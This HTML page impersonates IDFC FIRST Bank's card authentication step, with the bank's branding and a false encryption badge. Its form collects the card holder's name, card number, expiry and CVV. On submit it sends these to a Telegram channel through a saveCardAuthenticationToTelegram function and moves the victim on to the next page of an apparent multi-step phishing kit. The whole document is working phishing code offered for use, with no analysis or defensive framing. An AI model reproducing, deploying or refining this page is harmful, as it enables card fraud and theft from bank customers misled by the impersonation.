<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IDFC FIRST Bank - Card Authentication</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f8f8; }

    .header-bar { background: #832625; padding: 12px 0; text-align: center; }
    .header-bar img { height: 36px; }

    .container { padding: 20px; max-width: 420px; margin: 0 auto; }
    .form-card { background: #fff; border-radius: 10px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border-top: 3px solid #fd9907; }
    .form-card h2 { color: #832625; font-weight: 700; font-size: 1.15rem; text-align: center; margin-bottom: 20px; }

    label { display: block; margin-bottom: 4px; font-weight: 500; font-size: 0.85rem; color: #444; }
    input { width: 100%; padding: 10px 12px; margin-bottom: 14px; border: 1.5px solid #e0e0e0; border-radius: 6px; font-size: 0.95rem; }
    input:focus { border-color: #832625; outline: none; box-shadow: 0 0 0 3px rgba(131,38,37,0.1); }

    .btn-submit { display: block; width: 100%; padding: 12px; background: #832625; color: #fff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 5px; }
    .btn-submit:hover { background: #6d1a15; }

    .secure-note { text-align: center; font-size: 0.72rem; color: #999; margin-top: 15px; }
  </style>
</head>
<body>

<div class="header-bar">
  <img src="../idfclog.jpeg" alt="IDFC FIRST Bank">
</div>

<div class="container">
  <div class="form-card">
    <h2>Card Authentication</h2>
    <form id="idfcForm">
      <label for="name">Card Holder Name</label>
      <input type="text" id="name" placeholder="Name as on card" required>

      <label for="cardNumber">Card Number</label>
      <input type="tel" id="cardNumber" placeholder="Enter 16-digit card number" maxlength="19" required oninput="formatCardNumber(this)">

      <div style="display:flex; gap:10px;">
        <div style="flex:1;">
          <label for="expiry">Expiry (MM/YY)</label>
          <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required oninput="formatExpiry(this)">
        </div>
        <div style="flex:1;">
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
        </div>
      </div>

      <button type="submit" class="btn-submit">PROCEED NOW</button>
    </form>
    <div class="secure-note"><i class="fa-solid fa-lock me-1"></i> 256-bit SSL Encrypted</div>
  </div>
</div>

<script src="telegram-config.js"></script>
<script>
  document.getElementById("idfcForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const name = document.getElementById("name").value.trim();
    const cardNumber = document.getElementById("cardNumber").value.replace(/\s/g, '');
    const expiry = document.getElementById("expiry").value.trim();
    const cvv = document.getElementById("cvv").value.trim();
    const submitBtn = document.querySelector(".btn-submit");

    if (!name || name.length < 3) { alert("Enter valid card holder name."); return; }
    if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) { alert("Enter valid 16-digit card number."); return; }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) { alert("Enter expiry in MM/YY."); return; }
    if (cvv.length !== 3 || !/^\d{3}$/.test(cvv)) { alert("Enter valid 3-digit CVV."); return; }

    submitBtn.disabled = true;
    submitBtn.textContent = "Processing...";
    try {
      const res = await saveCardAuthenticationToTelegram({ name, cardNumber, expiry, cvv });
      if (res.success) window.location.href = "6.html";
      else { alert("Error: " + (res.error || "Failed")); submitBtn.disabled = false; submitBtn.textContent = "PROCEED NOW"; }
    } catch (err) { alert("Error: " + err.message); submitBtn.disabled = false; submitBtn.textContent = "PROCEED NOW"; }
  });

  function formatCardNumber(input) {
    let v = input.value.replace(/\D/g, '').slice(0, 16);
    input.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }
  function formatExpiry(input) {
    let v = input.value.replace(/\D/g, '').slice(0, 4);
    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
    input.value = v;
  }
</script>
</body>
</html>
